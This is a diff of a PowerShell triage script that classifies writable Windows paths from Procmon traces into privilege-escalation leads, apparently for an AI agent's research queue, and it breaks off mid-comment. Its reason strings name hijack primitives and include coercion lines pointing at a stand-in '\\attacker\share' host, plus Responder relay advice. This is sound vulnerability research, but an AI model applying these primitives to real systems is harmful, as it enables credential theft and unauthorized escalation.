@@ -6,54 +6,40 @@
 )
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  Analyze-ExecutionLeads (rev 2)
+#  Analyze-ExecutionLeads (rev 3.3)
 #
-#  Reads a writable_paths.json feed (from Parse-ProcmonWriteables rev 2) and
+#  Reads a writable_paths.json feed (from Parse-ProcmonWriteables rev 3.3) and
 #  emits two queues:
 #    high_confidence_leads.json    — heuristic matches, structured per primitive
 #    cognitive_review_queue.json   — items that need agent semantic review
 #
-#  Threat model: standard local user (medium IL), no SeImpersonatePrivilege,
-#  no admin group membership. Privileged consumer = High/System integrity, OR
-#  a SYSTEM service impersonating the user (the latter is a separate threat
-#  class — credential coercion, ACL-of-user, but the bug is still the bug).
-#
-#  Hardenings vs rev 1:
-#   - Drops Paging-I/O attributions (LPE prompt §2 false-positive class).
-#   - Drops self-trace contamination already filtered upstream.
-#   - Drops "user-already-has-it" entries unless a privileged actor is involved
-#     (LPE prompt §9 false-positive class).
-#   - Down-weights leads where Open Reparse Point / Open Link is already set on
-#     EVERY observed event (informative-but-not-disqualifying — kept in
-#     cognitive queue with a hint).
-#   - LOLBin matching is now extension-aware: powershell.exe touching ~/Downloads
-#     no longer becomes a "LOLBin Proxy Target".
-#   - Adds: COM Hijack (HKCU\Software\Classes\CLSID), Environment-variable
-#     hijack (HKCU\Environment, including SilentCleanup-class windir/SystemRoot
-#     hijack), App-Execution-Alias planting (%LOCALAPPDATA%\Microsoft\WindowsApps),
-#     PowerShell-profile sinks, Electron .asar tamper, desktop.ini IconResource
-#     coercion, Scheduled Task trigger XML, IFEO/AeDebug debugger hijack,
-#     Service binary path hijack.
-#   - Impersonation-aware text in SMB-coercion and registry-coercion verdicts.
-#   - Severity boost when same path has both privileged Read AND Write events
-#     (race opportunity).
+#  Threat model: perspective-aware across LowPriv (medium-IL standard user),
+#  MediumILAdmin (UAC-filtered split-token admin), and HighILAdmin (elevated
+#  admin targeting SYSTEM / TrustedInstaller).
 # ═══════════════════════════════════════════════════════════════════════════════
 
 $feedDir = Split-Path $JsonFeed
 if ([string]::IsNullOrWhiteSpace($feedDir)) { $feedDir = ".\" }
 
 Write-Host "[*] Initiating Advanced Execution Lead Analysis on: $JsonFeed" -ForegroundColor Cyan
-Write-Host "    Mode: Low-Privilege Attacker Model (no SeImpersonatePrivilege assumed)" -ForegroundColor Gray
+Write-Host "    Mode: Perspective-Aware Attacker Model (LowPriv / MediumILAdmin / HighILAdmin)" -ForegroundColor Gray
 
 if (-not (Test-Path $JsonFeed)) {
     Write-Host "[-] JSON feed not found" -ForegroundColor Red
-    exit
+    exit 1
 }
 
-$rawData = Get-Content $JsonFeed -Raw | ConvertFrom-Json
-if (-not $rawData) {
-    Write-Host "[!] No data parsed from JSON." -ForegroundColor Yellow
-    exit
+$hardcodedJsonPath = Join-Path $feedDir "high_confidence_leads.json"
+$cognitiveJsonPath = Join-Path $feedDir "cognitive_review_queue.json"
+
+$rawContent = Get-Content $JsonFeed -Raw
+$parsedJson = if (-not [string]::IsNullOrWhiteSpace($rawContent)) { $rawContent | ConvertFrom-Json } else { $null }
+$rawData = @($parsedJson | Where-Object { $null -ne $_ })
+if ($rawData.Count -eq 0) {
+    Write-Host "[!] No paths in JSON feed. Writing empty output queues." -ForegroundColor Yellow
+    "[]" | Out-File $hardcodedJsonPath -Encoding UTF8
+    "[]" | Out-File $cognitiveJsonPath -Encoding UTF8
+    exit 0
 }
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -133,26 +119,38 @@ function Get-EscalationCategory {
         [bool]$anyImpersonating = $false
     )
 
-    # Primitive overrides — some primitives are inherently a specific category
-    # regardless of the writability perspective or the observed consumer's IL.
-    # User-scope persistence primitives (AppExecAlias squat, PowerShell profile
-    # auto-load, Electron .asar tamper) are escalation surfaces even when the
-    # only observed consumer in the trace is medium-IL: the plant lies in wait
-    # for whichever account next invokes the binary, including admin RunAs,
-    # scheduled tasks running as the user from elevated context, etc.
-    if ($primitive -in @('COM_Hijack_HKCU','Env_Hijack_HKCU')) { return 'UAC_Bypass' }
-    if ($primitive -in @('Service_BinaryPath','IFEO_Debugger','AeDebug','ScheduledTask_Plant')) { return 'Admin_To_System' }
-    if ($primitive -in @('URL_NTLM_Coerce','Theme_NTLM_Coerce','DesktopIni_Coerce','WebShell_Plant','LNK_Hijack','Cert_Plant')) { return 'RCE_Lateral' }
-    if ($primitive -in @('LOLBin_Proxy','AutoRun_Persistence')) { return 'Proxy_Execution' }
-    if ($primitive -in @('AppExecAlias_Plant','PowerShell_Profile','Electron_AsarTamper','SxS_DotLocal','Dependency_Hijack','Cert_Plant')) { return 'LPE' }
+    $consumerHighIL   = $consumerIntegrity -in @('High','System','Protected Process')
+    $consumerSystemTI = $consumerIntegrity -in @('System','Protected Process')
+    $consumerUnknown  = [string]::IsNullOrWhiteSpace($consumerIntegrity) -or ($consumerIntegrity -eq 'Unknown')
 
-    $consumerHighIL    = $consumerIntegrity -in @('High','System','Protected Process')
-    $consumerSystemTI  = $consumerIntegrity -eq 'System' -or $consumerIntegrity -eq 'Protected Process'
+    # Primitive overrides — some primitives are inherently a specific category,
+    # gated by the writability perspective so HighILAdmin-only paths are never
+    # misclassified as low-priv LPEs.
+    if ($primitive -in @('COM_Hijack_HKCU','Env_Hijack_HKCU')) { return 'UAC_Bypass' }
+    if ($primitive -in @('Service_BinaryPath','IFEO_Debugger','AeDebug','ScheduledTask_Plant')) {
+        if ($writableFrom -eq 'LowPriv')       { return 'LPE' }
+        if ($writableFrom -eq 'MediumILAdmin') { return 'UAC_Bypass' }
+        return 'Admin_To_System'
+    }
+    if ($primitive -in @('URL_NTLM_Coerce','Theme_NTLM_Coerce','DesktopIni_Coerce','WebShell_Plant','LNK_Hijack','Cert_Plant')) {
+        return 'RCE_Lateral'
+    }
+    if ($primitive -in @('LOLBin_Proxy','AutoRun_Persistence')) {
+        return 'Proxy_Execution'
+    }
+    if ($primitive -in @('AppExecAlias_Plant','PowerShell_Profile','Electron_AsarTamper','SxS_DotLocal','Dependency_Hijack','Binary_Plant_HighPriv','Pipe_Hijack','Config_Poison')) {
+        switch ($writableFrom) {
+            'LowPriv'       { return 'LPE' }
+            'MediumILAdmin' { return 'UAC_Bypass' }
+            'HighILAdmin'   { if ($consumerSystemTI -or $consumerUnknown) { return 'Admin_To_System' } else { return 'Same_Level' } }
+            default         { return 'LPE' }
+        }
+    }
 
     switch ($writableFrom) {
-        'LowPriv'        { if ($consumerHighIL)   { return 'LPE' }              else { return 'Same_Level' } }
-        'MediumILAdmin'  { if ($consumerHighIL)   { return 'UAC_Bypass' }       else { return 'Same_Level' } }
-        'HighILAdmin'    { if ($consumerSystemTI) { return 'Admin_To_System' }  else { return 'Same_Level' } }
+        'LowPriv'        { if ($consumerHighIL -or $consumerUnknown) { return 'LPE' }             else { return 'Same_Level' } }
+        'MediumILAdmin'  { if ($consumerHighIL -or $consumerUnknown) { return 'UAC_Bypass' }      else { return 'Same_Level' } }
+        'HighILAdmin'    { if ($consumerSystemTI)                    { return 'Admin_To_System' } else { return 'Same_Level' } }
         default          { return 'Unknown' }
     }
 }
@@ -285,6 +283,11 @@ foreach ($entry in $rawData) {
     $anyImpersonating = [bool](Get-FieldValue $entry "AnyImpersonating" $false)
     $anyOpenRP        = [bool](Get-FieldValue $entry "AnyOpenReparsePoint" $false)
     $anyOpenLink      = [bool](Get-FieldValue $entry "AnyOpenLink" $false)
+    $hasAllOpenRP     = ($null -ne (Get-FieldValue $entry "AllOpenReparsePoint" $null))
+    $allOpenRP        = if ($hasAllOpenRP) { [bool](Get-FieldValue $entry "AllOpenReparsePoint" $false) } else { $openRP -and $anyOpenRP }
+    $hasAllOpenLink   = ($null -ne (Get-FieldValue $entry "AllOpenLink" $null))
+    $allOpenLink      = if ($hasAllOpenLink) { [bool](Get-FieldValue $entry "AllOpenLink" $false) } else { $openLink -and $anyOpenLink }
+    $highestIntegrity = Get-FieldValue $entry "HighestIntegrity" $integrity
     $isUserOnly       = [bool](Get-FieldValue $entry "IsUserOnlyConsumer" $false)
     $sqosFromFeed     = Get-FieldValue $entry "SqosLevel" "NotSpecified"
 
@@ -314,14 +317,21 @@ foreach ($entry in $rawData) {
 
     $opDirection   = Get-OperationDirection -Operation $operation
     $sqos          = Get-SqosLevel -Detail $detail -Existing $sqosFromFeed
-    $isPrivileged  = Test-PrivilegedIntegrity -Integrity $integrity
-    $isPrivilegedAny = $isPrivileged -or $anyPrivRead -or $anyPrivWrite
-    $isNameNotFound = ($result -match "(?i)NAME NOT FOUND")
+    $effectiveIntegrity = if (Test-PrivilegedIntegrity -Integrity $integrity) {
+        $integrity
+    } elseif (Test-PrivilegedIntegrity -Integrity $highestIntegrity) {
+        $highestIntegrity
+    } else {
+        $integrity
+    }
+    $isPrivileged    = (Test-PrivilegedIntegrity -Integrity $effectiveIntegrity) -or $anyPrivRead -or $anyPrivWrite
+    $isPrivilegedAny = $isPrivileged
+    $isNameNotFound  = ($result -match "(?i)NAME NOT FOUND")
     # Filesystem vs registry — gates the FS-only LPE primitives (Rules 5/6/7).
     # NTFS junction / oplock / pipe-symlink plants require an actual FS path;
     # they can't be planted on a registry key. Mirrors the parser's path class.
-    $isFsPath      = ($path -match "^[a-zA-Z]:\\") -or ($path -match "^\\\\")
-    $effectivePrincipal = Get-EffectivePrincipal -Integrity $integrity -Impersonating $impersonating
+    $isFsPath        = ($path -match "^[a-zA-Z]:\\") -or ($path -match "^\\\\")
+    $effectivePrincipal = Get-EffectivePrincipal -Integrity $effectiveIntegrity -Impersonating $impersonating
 
     # ─────────────────────────────────────────────────────────────────────────
     # FALSE-POSITIVE FILTERS (LPE prompt § 2 / § 9)
@@ -342,7 +352,7 @@ foreach ($entry in $rawData) {
             Operation = $operation
             Result = $result
             Detail = $detail
-            Integrity = $integrity
+            Integrity = $effectiveIntegrity
             Impersonating = $impersonating
             OperationDirection = $opDirection
             SqosLevel = $sqos
@@ -351,21 +361,12 @@ foreach ($entry in $rawData) {
         continue
     }
 
-    # LPE §9: "user-already-has-it" — the only consumer is the current user's
-    # own session and no privileged actor touches the path. The redirect
-    # cannot reach anywhere the user couldn't reach already.
-    if ($isUserOnly -and (-not $isPrivilegedAny) -and (-not $anyImpersonating)) {
-        $dropUserOnly++
-        # Don't even add to cognitive queue — pure noise.
-        continue
-    }
-
     # When EVERY observed event already had Open Reparse Point set, the
     # consumer is correctly using FILE_FLAG_OPEN_REPARSE_POINT. Demote to the
     # cognitive queue with a hint so an analyst can still scan the surrounding
     # code path (LPE §2: another open of the same path elsewhere may still be
     # missing the flag).
-    if ($anyOpenRP -and -not $anyWrite) {
+    if ($allOpenRP -and -not $anyWrite) {
         $dropOpenReparse++
         $cognitiveQueue.Add([PSCustomObject]@{
             Path = $path
@@ -376,7 +377,7 @@ foreach ($entry in $rawData) {
             Operation = $operation
             Result = $result
             Detail = $detail
-            Integrity = $integrity
+            Integrity = $effectiveIntegrity
             Impersonating = $impersonating
             OperationDirection = $opDirection
             SqosLevel = $sqos
@@ -385,7 +386,7 @@ foreach ($entry in $rawData) {
         continue
     }
     # Same logic for registry: every observed open had REG_OPTION_OPEN_LINK.
-    if ($anyOpenLink -and ($path -match "^HK")) {
+    if ($allOpenLink -and ($path -match "^HK")) {
         $dropOpenLink++
         $cognitiveQueue.Add([PSCustomObject]@{
             Path = $path
@@ -396,7 +397,7 @@ foreach ($entry in $rawData) {
             Operation = $operation
             Result = $result
             Detail = $detail
-            Integrity = $integrity
+            Integrity = $effectiveIntegrity
             Impersonating = $impersonating
             OperationDirection = $opDirection
             SqosLevel = $sqos
@@ -424,7 +425,7 @@ foreach ($entry in $rawData) {
             Operation = $operation
             Result = $result
             Detail = $detail
-            Integrity = $integrity
+            Integrity = $effectiveIntegrity
             Impersonating = $impersonating
             OperationDirection = $opDirection
             SqosLevel = $sqos
@@ -436,13 +437,13 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 1: Named Pipe Hijacking (literal pipe paths)
     # ─────────────────────────────────────────────────────────────────────────
-    if ($path -match "^\\\\\.\\pipe\\") {
+    if ($path -match "^\\\\\.\\pipe\\" -and ($writableLow -or $writableMed)) {
         $severity = "Critical"
         $type = "Named Pipe Hijacking / Impersonation"
         $exploitPrimitive = "Pipe_Hijack"
         $reason = "Direct named-pipe endpoint at a writable location. A medium-IL attacker can plant a pipe server here and capture connecting clients."
         if ($isPrivileged) {
-            $reason += " PRIVILEGED CLIENT ($integrity) connects → token material available."
+            $reason += " PRIVILEGED CLIENT ($effectiveIntegrity) connects → token material available."
         }
         if ($sqos -in @("NotSpecified","Impersonation","Delegation")) {
             $reason += " SQOS=$sqos → impersonation-safe for service accounts; SMB relay viable for standard users."
@@ -457,13 +458,13 @@ foreach ($entry in $rawData) {
     # RULE 1.5: AppExecLink Squatting (HIGH VALUE — explicit in the
     # Security_Research_Addendum §2 for this project)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)\\AppData\\Local\\Microsoft\\WindowsApps\\") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(?i)\\AppData\\Local\\Microsoft\\WindowsApps\\") {
         $severity = "High"
         $type = "App Execution Alias Squatting"
         $exploitPrimitive = "AppExecAlias_Plant"
         $reason = "Path lives under %LOCALAPPDATA%\\Microsoft\\WindowsApps — an App Execution Alias folder that is on the user's PATH. Dropping a binary here that shadows an unqualified command ('notepad', 'wt', 'winget', 'bash', etc.) hijacks subsequent invocations. ACL anomaly note: Microsoft default is TrustedInstaller-owned with conditional WIN://SYSAPPID ACEs; a user-FullControl ACE here is non-default and is itself worth flagging."
         if ($isPrivileged) {
-            $reason += " A privileged consumer ($integrity) was observed touching this folder — chain potentially elevates beyond user-scope squatting."
+            $reason += " A privileged consumer ($effectiveIntegrity) was observed touching this folder — chain potentially elevates beyond user-scope squatting."
         }
         $isDirectLead = $true
     }
@@ -471,7 +472,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 1.6: PowerShell profile sinks (auto-loaded on every shell start)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)\\(Documents\\(WindowsPowerShell|PowerShell)\\(Microsoft\.)?(PowerShell_)?profile\.ps1|Documents\\PowerShell\\Modules\\.+\.psm1)$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(?i)\\(Documents\\(WindowsPowerShell|PowerShell)\\(Microsoft\.)?(PowerShell_)?profile\.ps1|Documents\\(WindowsPowerShell|PowerShell)\\Modules\\.+\.(psm1|ps1))$") {
         $severity = "High"
         $type = "PowerShell Profile Auto-Load Sink"
         $exploitPrimitive = "PowerShell_Profile"
@@ -482,7 +483,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 1.7: Electron app.asar tamper surface
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)\\resources\\app\.asar(\.unpacked)?(\\|$)") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) -and $path -match "(?i)\\resources\\app\.asar(\.unpacked)?(\\|$)") {
         $severity = "High"
         $type = "Electron app.asar Tamper"
         $exploitPrimitive = "Electron_AsarTamper"
@@ -504,16 +505,15 @@ foreach ($entry in $rawData) {
     #                              path. Still relevant for admin -> SYSTEM
     #                              research. Tagged High severity and routed
     #                              to AdminToSystemKernel_Research_Prompt.
-    #
-    # We keep the same ExploitPrimitive id in both cases so the prompt
-    # mapping in Research-Lead doesn't need a sub-discriminator.
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SYSTEM\\CurrentControlSet\\Services\\.+\\(ImagePath|ServiceDll)$") {
+    $isSvcValuePath = ($path -match "(?i)^HKLM\\SYSTEM\\(CurrentControlSet|ControlSet\d+)\\Services\\.+\\(ImagePath|ServiceDll|FailureCommand)$")
+    $isSvcKeyAnomaly = (($writableLow -or $writableMed) -and ($path -match "(?i)^HKLM\\SYSTEM\\(CurrentControlSet|ControlSet\d+)\\Services\\[^\\]+(\\Parameters)?$"))
+    if (-not $isDirectLead -and ($isSvcValuePath -or $isSvcKeyAnomaly)) {
         $exploitPrimitive = "Service_BinaryPath"
         if ($writableLow) {
             $severity = "Critical"
             $type = "Service Binary Path Hijack (ACL anomaly)"
-            $reason = "Service ImagePath/ServiceDll under HKLM is writable by a NON-ADMIN user. Non-default ACL; direct LPE primitive: rewrite the value, restart the service, run as the service account."
+            $reason = "Service key or ImagePath/ServiceDll under HKLM is writable by a NON-ADMIN user. Non-default ACL; direct LPE primitive: rewrite the value, restart the service, run as the service account."
         } else {
             $severity = "High"
             $type = "Service Binary Path Hijack (admin -> SYSTEM)"
@@ -521,12 +521,14 @@ foreach ($entry in $rawData) {
         }
         $isDirectLead = $true
     }
-    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\.+\\(Debugger|GlobalFlag)$") {
+    $isIfeoValuePath = ($path -match "(?i)^HKLM\\SOFTWARE\\(Wow6432Node\\)?Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\.+\\(Debugger|GlobalFlag|VerifierDlls)$")
+    $isIfeoKeyAnomaly = (($writableLow -or $writableMed) -and ($path -match "(?i)^HKLM\\SOFTWARE\\(Wow6432Node\\)?Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\[^\\]+$"))
+    if (-not $isDirectLead -and ($isIfeoValuePath -or $isIfeoKeyAnomaly)) {
         $exploitPrimitive = "IFEO_Debugger"
         if ($writableLow) {
             $severity = "Critical"
             $type = "IFEO Debugger Hijack (ACL anomaly)"
-            $reason = "IFEO Debugger value writable to a NON-ADMIN user. Non-default ACL; plant your binary here; whenever the targeted EXE is launched, the OS spawns YOUR debugger as the parent."
+            $reason = "IFEO Debugger key/value writable to a NON-ADMIN user. Non-default ACL; plant your binary here; whenever the targeted EXE is launched, the OS spawns YOUR debugger as the parent."
         } else {
             $severity = "High"
             $type = "IFEO Debugger Hijack (admin -> SYSTEM)"
@@ -534,12 +536,14 @@ foreach ($entry in $rawData) {
         }
         $isDirectLead = $true
     }
-    if (-not $isDirectLead -and $path -match "(?i)^HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\Debugger$") {
+    $isAeDebugValuePath = ($path -match "(?i)^HKLM\\SOFTWARE\\(Wow6432Node\\)?Microsoft\\Windows NT\\CurrentVersion\\AeDebug\\(Debugger|Auto)$")
+    $isAeDebugKeyAnomaly = (($writableLow -or $writableMed) -and ($path -match "(?i)^HKLM\\SOFTWARE\\(Wow6432Node\\)?Microsoft\\Windows NT\\CurrentVersion\\AeDebug$"))
+    if (-not $isDirectLead -and ($isAeDebugValuePath -or $isAeDebugKeyAnomaly)) {
         $exploitPrimitive = "AeDebug"
         if ($writableLow) {
             $severity = "Critical"
             $type = "AeDebug Postmortem Debugger Hijack (ACL anomaly)"
-            $reason = "AeDebug Debugger value writable to a NON-ADMIN user. Non-default ACL; any crashing process triggers your binary as the postmortem handler."
+            $reason = "AeDebug Debugger key/value writable to a NON-ADMIN user. Non-default ACL; any crashing process triggers your binary as the postmortem handler."
         } else {
             $severity = "High"
             $type = "AeDebug Postmortem Debugger Hijack (admin -> SYSTEM)"
@@ -551,7 +555,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 1.9: COM Hijack via HKCU\Software\Classes\CLSID
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Software\\Classes\\(CLSID|Wow6432Node\\CLSID|Interface)\\\{[0-9a-fA-F-]+\}") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Software\\Classes\\(CLSID|Wow6432Node\\CLSID|Interface)\\\{[0-9a-fA-F-]+\}") {
         $severity = "High"
         $type = "Per-User COM Hijack"
         $exploitPrimitive = "COM_Hijack_HKCU"
@@ -566,7 +570,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 1.10: HKCU\Environment hijack (SilentCleanup-class UAC bypass family)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Environment(\\|$)") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(?i)^(HKCU|HKEY_CURRENT_USER|HKU\\[^\\]+)\\Environment(\\|$)") {
         $severity = "High"
         $type = "Environment Variable Hijack (UAC-bypass adjacent)"
         $exploitPrimitive = "Env_Hijack_HKCU"
@@ -581,29 +585,45 @@ foreach ($entry in $rawData) {
 
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2: Binary Planting / DLL Hijacking
+    #
+    # Gated so that non-privileged existing user-space binaries without a
+    # privileged consumer in the trace fall through to Cognitive Queue
+    # Branch 4 (PersistenceBinary_NoPrivilegedConsumer), while:
+    #   - Any LowPriv/MedIL-writable binary in a high-priv directory
+    #   - Any binary touched by a privileged or impersonating process
+    #   - Any missing binary (NAME NOT FOUND) in a writable directory
+    # fires directly here.
     # ─────────────────────────────────────────────────────────────────────────
     if (-not $isDirectLead -and $path -match "\.(exe|dll|sys|cpl|ocx|efi|scr|msi|msp|msc|com|hta|jar|xll|wll|xla|drv|tlb|node)$") {
-        if ($path -match "(System32|SysWOW64|Program Files|ProgramData\\[^\\]+\\|\\Windows\\)") {
-            $severity = "Critical"
-            $type = "Binary Planting (High-Priv Dir)"
-            $exploitPrimitive = "Binary_Plant_HighPriv"
-            $reason = "Writable executable under a privileged directory. If loaded by a SYSTEM/High process, attacker gets code execution at that integrity with zero special privileges."
-        } else {
-            $severity = "High"
-            $type = "Binary Planting (User Space)"
-            $exploitPrimitive = "Binary_Plant_UserSpace"
-            $reason = "Writable executable. Prone to DLL search-order hijacking or direct execution. No privileges required to replace; impact depends on what principal next executes it."
+        $isHighPrivDir = ($path -match "(?i)(System32|SysWOW64|Program Files|ProgramData\\[^\\]+\\|\\Windows\\)")
+        $shouldFireRule2 = ($isHighPrivDir -and ($writableLow -or $writableMed)) `
+            -or ($isPrivilegedAny -and ($writableLow -or $writableMed -or $writableHigh)) `
+            -or ($anyImpersonating -and ($writableLow -or $writableMed)) `
+            -or ($isNameNotFound -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)))
+
+        if ($shouldFireRule2) {
+            if ($isHighPrivDir) {
+                $severity = "Critical"
+                $type = "Binary Planting (High-Priv Dir)"
+                $exploitPrimitive = "Binary_Plant_HighPriv"
+                $reason = "Writable executable under a privileged directory. If loaded by a SYSTEM/High process, attacker gets code execution at that integrity with zero special privileges."
+            } else {
+                $severity = "High"
+                $type = "Binary Planting (User Space)"
+                $exploitPrimitive = "Binary_Plant_UserSpace"
+                $reason = "Writable executable. Prone to DLL search-order hijacking or direct execution. No privileges required to replace; impact depends on what principal next executes it."
+            }
+            if ($isPrivileged) {
+                $reason += " LOADED BY PRIVILEGED PROCESS ($effectiveIntegrity) → direct code execution at that integrity."
+            }
+            $isDirectLead = $true
         }
-        if ($isPrivileged) {
-            $reason += " LOADED BY PRIVILEGED PROCESS ($integrity) → direct code execution at that integrity."
-        }
-        $isDirectLead = $true
     }
 
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2.1: SxS / DotLocal Manifest Hijacking
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "\.(manifest|local)$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) -and $path -match "\.(manifest|local)$") {
         $severity = "Critical"
         $type = "SxS / DotLocal Manifest Poisoning"
         $exploitPrimitive = "SxS_DotLocal"
@@ -614,7 +634,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2.2: Package / Dependency Hijacking
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(node_modules|site-packages|vendor\\|gems\\|\\.cargo\\registry)") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed -or ($writableHigh -and $isPrivilegedAny)) -and $path -match "(node_modules|site-packages|vendor\\|gems\\|\\.cargo\\registry)") {
         $severity = "Critical"
         $type = "Dependency / Package Subversion"
         $exploitPrimitive = "Dependency_Hijack"
@@ -625,7 +645,7 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2.3: Web Shell / Webroot Planting
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(inetpub\\wwwroot|xampp\\htdocs|tomcat\\webapps|nginx\\html)" -and $path -match "\.(aspx|php|jsp|asmx|html|ashx|asp)$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(inetpub\\wwwroot|xampp\\htdocs|tomcat\\webapps|nginx\\html)" -and $path -match "\.(aspx|php|jsp|asmx|html|ashx|asp)$") {
         $severity = "Critical"
         $type = "Web Shell Proxy / Server Planting"
         $exploitPrimitive = "WebShell_Plant"
@@ -636,21 +656,21 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2.4: LNK Shortcut Poisoning + URL/Theme/PIF coercion
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "\.lnk$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "\.lnk$") {
         $severity = "High"
         $type = "LNK Shortcut Hijacking"
         $exploitPrimitive = "LNK_Hijack"
         $reason = "Writable .lnk shortcut. Modify target to redirect execution; or set Icon to UNC for NTLM coercion (CVE-2025-50154 family). No privileges needed."
         $isDirectLead = $true
     }
-    if (-not $isDirectLead -and $path -match "\.url$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "\.url$") {
         $severity = "High"
         $type = ".URL Internet Shortcut NTLM Coercion"
         $exploitPrimitive = "URL_NTLM_Coerce"
         $reason = "Writable '.url' Internet shortcut. CVE-2024-43451 family — 'IconFile=\\\\attacker\\share\\icon.ico' triggers NTLMv2 from any user who interacts with the shortcut (single click, right-click, drag-move). Capture with Responder; relay or crack."
         $isDirectLead = $true
     }
-    if (-not $isDirectLead -and $path -match "\.(theme|themepack|deskthemepack)$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "\.(theme|themepack|deskthemepack)$") {
         $severity = "High"
         $type = "Theme NTLM Coercion (CVE-2024-21320 family)"
         $exploitPrimitive = "Theme_NTLM_Coerce"
@@ -661,29 +681,19 @@ foreach ($entry in $rawData) {
     # ─────────────────────────────────────────────────────────────────────────
     # RULE 2.5: desktop.ini IconResource SMB coercion (Section 8 of addendum)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)\\desktop\.ini$") {
+    if (-not $isDirectLead -and ($writableLow -or $writableMed) -and $path -match "(?i)\\desktop\.ini$") {
         $severity = "Medium"
         $type = "desktop.ini IconResource Coercion"
         $exploitPrimitive = "DesktopIni_Coerce"
-        $reason = "Writable desktop.ini. `[. ShellClassInfo] IconResource=\\\\attacker\\share\\icon.ico` coerces an SMB handshake from any interactive user who renders the parent folder in Explorer. Severity is environment-dependent: HIGH on domain / hybrid-AAD hosts (NTLMv2 captured/relayed), LOW on AAD-only single-account hosts."
+        $reason = "Writable desktop.ini. `[.ShellClassInfo] IconResource=\\\\attacker\\share\\icon.ico` coerces an SMB handshake from any interactive user who renders the parent folder in Explorer. Severity is environment-dependent: HIGH on domain / hybrid-AAD hosts (NTLMv2 captured/relayed), LOW on AAD-only single-account hosts."
         $isDirectLead = $true
     }
 
     # ─────────────────────────────────────────────────────────────────────────
-    # RULE 3: AutoRun / Script Persistence
+    # RULE 4: Scheduled Task XML (placed BEFORE Rule 3 so \System32\Tasks\...
+    # is not shadowed by Rule 3's generic Tasks\ pattern)
     # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and ($path -match "\.(bat|ps1|psm1|psd1|vbs|vbe|cmd|wsf|js|jse|wsh)$" -or $path -match "(Startup|\\Run\\|\\RunOnce\\|\\Services\\|Tasks\\|wbem\\mof|scripts\\Startup|scripts\\Logon|scripts\\Shutdown|scripts\\Logoff)")) {
-        $severity = "High"
-        $type = "AutoRun / Script Persistence"
-        $exploitPrimitive = "AutoRun_Persistence"
-        $reason = "Writable script file or persistence location. Likely executed on boot/logon. No privileges needed to modify."
-        $isDirectLead = $true
-    }
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # RULE 4: Scheduled Task XML
-    # ─────────────────────────────────────────────────────────────────────────
-    if (-not $isDirectLead -and $path -match "(?i)\\System32\\Tasks\\.+$|\\schedule\\taskcache\\tree\\") {
+    if (-not $isDirectLead -and $path -match "(?i)\\(System32|SysWOW64)\\Tasks\\.+$|\\schedule\\taskcache\\tree\\") {
         $exploitPrimitive = "ScheduledTask_Plant"
         if ($writableLow) {
             $severity = "Critical"
@@ -698,87 +708,26 @@ foreach ($entry in $rawData) {
     }
 
     # ─────────────────────────────────────────────────────────────────────────
-    # RULE 5: SMB / NTLM Coercion via Path Redirection (LPE prompt §3.5)
-    #
-    # Gating: requires (a) a low-priv writable path — the entire exploit is a
-    # low-priv user planting an NTFS junction → drive-letter → \\attacker\share,
-    # so admin-only-writable paths can't trigger this primitive; admin already
